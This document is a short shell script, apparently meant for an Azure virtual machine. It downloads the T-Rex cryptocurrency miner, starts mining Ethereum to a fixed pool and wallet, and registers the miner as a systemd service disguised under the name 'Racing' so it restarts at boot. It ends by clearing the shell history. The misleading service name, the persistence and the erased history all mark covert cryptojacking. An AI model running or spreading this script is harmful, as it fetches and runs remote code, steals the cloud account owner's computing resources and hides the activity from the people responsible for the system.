cd /home
myworker=$(date +'%d%m_M')
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
echo "xxx vip pro" > isHaveSetupCoin.txt
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz ; tar -zxvf t-rex-0.25.12-linux.tar.gz 
./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker &

sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_Re_Hot\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
history -c
